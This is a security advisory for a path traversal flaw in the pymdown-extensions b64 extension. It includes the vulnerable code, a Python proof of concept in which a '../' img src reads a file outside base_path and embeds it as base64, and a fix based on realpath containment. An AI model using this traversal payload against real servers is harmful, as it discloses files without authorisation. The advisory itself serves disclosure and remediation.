# [M] PyMdown Extensions: Path traversal in the b64 extension lets <img src> read files outside base_path

## Summary
Severity: Medium
Advisory: GHSA-9xwg-3r6f-jcx2
CVE: CVE-2026-61632
CWE: CWE-22
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N (CVSS_V3)
Published: 2026-07-24
Source: https://github.com/advisories/GHSA-9xwg-3r6f-jcx2
Type: github-advisory

## Affected
- PyPI: `pymdown-extensions` — affected >=0 <11.0.0

## Details
### Summary

The `b64` extension inlines images referenced by `<img src="...">` as base64 data URIs. When resolving the `src` path it joins it onto the configured `base_path` with `os.path.normpath` and opens the result directly, with no check that the resolved path stays inside `base_path`. A `src` containing `../` sequences, or an absolute path, therefore reads a file outside `base_path` as long as that file has an allowed image extension (`.png`, `.jpg`, `.jpeg`, `.gif`, `.svg`). The base64 of that file is then embedded in the rendered output, disclosing its contents.

This is a separate code path from the `snippets` traversal issues (GHSA-jh85-wwv9-24hv, GHSA-62q4-447f-wv8h). It lives in `pymdownx/b64.py` and has no path restriction of any kind. Confirmed on `10.21.3` installed from PyPI.

### Details

In `pymdownx/b64.py`, function `repl_path` (around lines 68 to 90 on `main`):

```python
if is_absolute:
    file_name = os.path.normpath(path)                          # absolute src: base_path ignored entirely
else:
    file_name = os.path.normpath(os.path.join(base_path, path)) # relative src: '../' escapes base_path
if os.path.exists(file_name):
    ext = os.path.splitext(file_name)[1].lower()
    for b64_ext in file_types:
        if ext in b64_ext:
            with open(file_name, "rb") as f:                    # opened with no containment check
                ...
```

There is no `startswith(base_path)`, no `os.path.realpath` comparison, and no rejection of `..`. Both branches are reachable from an attacker-controlled `src`.

### PoC

Reproduced against an unmodified `pymdown-extensions==10.21.3` from PyPI. The script creates a `base_path` directory and a PNG one level above it, then renders Markdown whose image `src` points outside `base_path`, and confirms the outside file's bytes appear base64-encoded in the output.

```python
import base64, os, shutil, tempfile, markdown

root = tempfile.mkdtemp()
base_path = os.path.join(root, "docs"); os.makedirs(base_path)
outside = os.path.join(root, "secret"); os.makedirs(outside)

png = base64.b64decode(
    "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNk"
    "+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg=="
)
with open(os.path.join(outside, "secret.png"), "wb") as f:
    f.write(png)

md = markdown.Markdown(
    extensions=["pymdownx.b64"],
    extension_configs={"pymdownx.b64": {"base_path": base_path}},
)
html = md.convert('<img src="../secret/secret.png">')

assert base64.b64encode(png).decode() in html, "not leaked"
print("LEAKED:", html)
```

Output:

```
LEAKED: <p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQ..."></p>
```

The base64 of a file outside `base_path` is present in the output. The absolute-path branch behaves the same way: an absolute `src` bypasses `base_path` entirely via `os.path.normpath(path)`. Both were confirmed leaking.

### Impact

An application that renders untrusted Markdown with `pymdownx.b64` enabled exposes the contents of image-extension files on the server, or any path the process can read, to whoever controls the Markdown and whoever views the output. The reach is bounded by the image-extension check, so it is a targeted file read rather than full arbitrary read, but it still discloses file contents that were never meant to be exposed.

### Suggested fix

Resolve the real path and require it to stay within `base_path` before opening:

```python
file_name = os.path.realpath(os.path.join(base_path, path))
base_real = os.path.realpath(base_path)
if file_name != base_real and not file_name.startswith(base_real + os.sep):
    return m.group(0)  # leave the tag untouched; do not read outside base_path
```

The same containment check should apply to the absolute-path branch rather than trusting an absolute `src`. Using `realpath` instead of `abspath` also closes the related symlink-following gap in the snippets handler.

## References
- https://github.com/facelessuser/pymdown-extensions/security/advisories/GHSA-9xwg-3r6f-jcx2
- https://github.com/facelessuser/pymdown-extensions/commit/edce35586d11a1ef78bb187bc60497fe6dbf3b64
- https://github.com/facelessuser/pymdown-extensions
- https://github.com/facelessuser/pymdown-extensions/releases/tag/11.0
